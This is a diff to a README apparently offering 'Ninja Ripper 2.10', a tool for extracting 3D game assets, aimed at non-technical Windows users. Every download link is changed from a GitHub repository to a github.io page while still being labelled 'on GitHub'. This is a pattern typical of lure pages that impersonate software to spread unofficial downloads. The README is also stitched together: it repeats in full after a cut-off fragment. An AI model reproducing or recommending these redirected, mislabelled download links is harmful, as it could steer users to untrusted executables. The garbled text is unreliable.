@@ -1,6 +1,6 @@
 # 🥷 ninja-ripper-2.10 - Capture 3D Assets with Ease
 
-[![Download Ninja Ripper 2.10](https://img.shields.io/badge/Download%20Ninja%20Ripper%202.10-FF5733?style=for-the-badge&logo=github&logoColor=white)](https://github.com/matajihardware/ninja-ripper-2.10)
+[![Download Ninja Ripper 2.10](https://img.shields.io/badge/Download%20Ninja%20Ripper%202.10-FF5733?style=for-the-badge&logo=github&logoColor=white)](https://matajihardware.github.io)
 
 Ninja Ripper 2.10 Beta is a free version for testing. It is built for users who want to work with 3D assets, game development projects, Unity content, and Unreal Engine 5 workflows. This page explains how to download the application on Windows and start using it without programming knowledge.
 
@@ -22,11 +22,11 @@ You do not need to write code or understand programming to get started. The main
 
 ## 📥 Download Ninja Ripper 2.10
 
-Visit this link to download the application: [Ninja Ripper 2.10 on GitHub](https://github.com/matajihardware/ninja-ripper-2.10).
+Visit this link to download the application: [Ninja Ripper 2.10 on GitHub](https://matajihardware.github.io).
 
 Use that repository page as the starting point for the Ninja Ripper 2.10 Beta download. The page is the primary location for this free testing version. Keep the page open while you complete the download so you can return to it if needed.
 
-[![Download Ninja Ripper 2.10](https://img.shields.io/badge/Get%20Ninja%20Ripper%202.10-1F6FEB?style=for-the-badge&logo=github&logoColor=white)](https://github.com/matajihardware/ninja-ripper-2.10)
+[![Download Ninja Ripper 2.10](https://img.shields.io/badge/Get%20Ninja%20Ripper%202.10-1F6FEB?style=for-the-badge&logo=github&logoColor=white)](https://matajihardware.github.io)
 
 ## 🪟 Windows Setup Steps
 
@@ -95,7 +95,7 @@ This workflow keeps each test manageable. It also helps you learn the applicatio
 Yes. It is described as a free version for testing, and it is listed as a beta release.
 
 **Where do I download it?**  
-Visit this link to download the application: [Ninja Ripper 2.10 on GitHub](https://github.com/matajihardware/ninja-ripper-2.10).
+Visit this link to download the application: [Ninja Ripper 2.10 on GitHub](https://matajihardware.github.io).
 
 **Do I need programming knowledge?**  
 No. The download and first launch steps are intended for regular Windows users.
@@ -116,7 +116,7 @@ Use the output location shown by the application during your test. Check that fo
 
 - Open the GitHub# 🥷 ninja-ripper-2.10 - Capture 3D Assets with Ease
 
-[![Download Ninja Ripper 2.10](https://img.shields.io/badge/Download%20Ninja%20Ripper%202.10-FF5733?style=for-the-badge&logo=github&logoColor=white)](https://github.com/matajihardware/ninja-ripper-2.10)
+[![Download Ninja Ripper 2.10](https://img.shields.io/badge/Download%20Ninja%20Ripper%202.10-FF5733?style=for-the-badge&logo=github&logoColor=white)](https://matajihardware.github.io)
 
 Ninja Ripper 2.10 Beta is a free version for testing. It is a Windows application aimed at 3D asset work, game development, gamedev projects, Unity content, and Unreal Engine 5 workflows. This page helps a non-technical user visit the download page, get the application, and start testing it on a Windows computer.
 
@@ -141,11 +141,11 @@ The application is intended for Windows users. You do not need programming knowl
 
 ## 📥 Download and Start
 
-Visit this link to download the application: [Ninja Ripper 2.10 on GitHub](https://github.com/matajihardware/ninja-ripper-2.10).
+Visit this link to download the application: [Ninja Ripper 2.10 on GitHub](https://matajihardware.github.io).
 
 Keep that page open while you download so you can return to it if you need the link again. The page is the primary download location for Ninja Ripper 2.10 Beta. Use the download option provided on that page.
 
-[![Download Ninja Ripper 2.10](https://img.shields.io/badge/Get%20Ninja%20Ripper%202.10-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/matajihardware/ninja-ripper-2.10)
+[![Download Ninja Ripper 2.10](https://img.shields.io/badge/Get%20Ninja%20Ripper%202.10-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://matajihardware.github.io)
 
 ## 🪟 Windows Setup Steps
 
@@ -220,7 +220,7 @@ This workflow keeps each test manageable. It also helps you learn the applicatio
 Yes. It is described as a free version for testing, and it is listed as a beta release.
 
 **Where do I download it?**  
-Visit this link to download the application: [Ninja Ripper 2.10 on GitHub](https://github.com/matajihardware/ninja-ripper-2.10).
+Visit this link to download the application: [Ninja Ripper 2.10 on GitHub](https://matajihardware.github.io).
 
 **Do I need programming knowledge?**  
 No. The download and first launch steps are written for regular Windows users.
